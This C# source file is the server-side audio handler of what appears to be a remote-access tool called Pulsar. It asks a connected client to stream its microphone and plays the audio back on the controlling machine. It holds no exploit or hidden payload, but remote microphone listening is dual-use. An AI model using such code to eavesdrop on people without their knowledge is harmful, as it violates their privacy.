using NAudio.Wave;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the microphone.
    /// </summary>
    public class AudioHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming microphone bits.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Represents the method that will handle microphone changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="device">All currently available microphones.</param>
        public delegate void MicrophoneChangedEventHandler(object sender, List<Tuple<int, string>> device);

        /// <summary>
        /// Raised when a microphone changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event MicrophoneChangedEventHandler MicrophoneChanged;

        /// <summary>
        /// Reports changed microphones.
        /// </summary>
        /// <param name="devices">All currently available microphones.</param>
        private void OnMicrophoneChanged(List<Tuple<int, string>> devices)
        {
            SynchronizationContext.Post(dvce =>
            {
                var handler = MicrophoneChanged;
                handler?.Invoke(this, (List <Tuple<int, string>>) dvce);
            }, devices);
        }

        /// <summary>
        /// The client which is associated with this audio handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="AudioHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public AudioHandler(Client client) : base(true)
        {
            _client = client;
        }


        /// <summary>
        /// Receives the bytes.
        /// </summary>
        BufferedWaveProvider _provider;

        /// <summary>
        /// Plays the received audio
        /// </summary>
        WaveOut _audioStream;

        /// <summary>
        /// Holds the desired bitrate
        /// </summary>
        public int _bitrate = 44100;

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetMicrophoneResponse || message is GetMicrophoneDeviceResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophoneResponse d:
                    Execute(sender, d);
                    break;
                case GetMicrophoneDeviceResponse m:
                    Execute(sender, m);
                    break;
            }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="device">The device to receive audio from.</param>
        public void BeginReceiveAudio(int device)
        {
            lock (_syncLock)
            {
                try
                {
                    IsStarted = true;
                    _provider = new BufferedWaveProvider(new WaveFormat());
                    _audioStream = new WaveOut();
                    _audioStream.Init(_provider);
                    _audioStream.Play();
                    _client.Send(new GetMicrophone { CreateNew = true, DeviceIndex = device, Bitrate = _bitrate });
                }
                catch (NAudio.MmException ex)
                {
                    // Handle the exception gracefully
                    IsStarted = false;
                    _provider = null;
                    _audioStream = null;
                    System.Windows.Forms.MessageBox.Show($"Error initializing audio device: {ex.Message}", 
                        "Audio Error", 
                        System.Windows.Forms.MessageBoxButtons.OK, 
                        System.Windows.Forms.MessageBoxIcon.Error);
                }
                catch (Exception ex)
                {
                    // Handle any other unexpected exceptions
                    IsStarted = false;
                    _provider = null;
                    _audioStream = null;
                    System.Windows.Forms.MessageBox.Show($"An unexpected error occurred: {ex.Message}",
                        "Audio Error",
                        System.Windows.Forms.MessageBoxButtons.OK,
                        System.Windows.Forms.MessageBoxIcon.Error);
                }
            }
        }

        /// <summary>
        /// Ends receiving audio from the client.
        /// </summary>
        /// /// <param name="device">The device to stop.</param>
        public void EndReceiveAudio(int device)
        {
            lock (_syncLock)
            {
                _client.Send(new GetMicrophone { DeviceIndex = device, Destroy = true });
                IsStarted = false;
            }
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshMicrophones()
        {
            _client.Send(new GetMicrophoneDevice());
        }

        private void Execute(ISender client, GetMicrophoneResponse message)
        {
            lock (_syncLock)
            {
                if (!IsStarted) 
                    return;

                _provider.AddSamples(message.Audio, 0, message.Audio.Length);
                message.Audio = null;

                client.Send(new GetMicrophone {DeviceIndex = message.Device, Bitrate = _bitrate});
            }
        }

        private void Execute(ISender client, GetMicrophoneDeviceResponse message)
        {
            OnMicrophoneChanged(message.DeviceInfos);
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    if(_audioStream != null)
                    {
                        _audioStream.Stop();
                        _provider.ClearBuffer();
                        _audioStream.Dispose();
                        _audioStream = null;
                        _provider = null;
                    }
                    IsStarted = false;
                }
            }
        }
    }
}
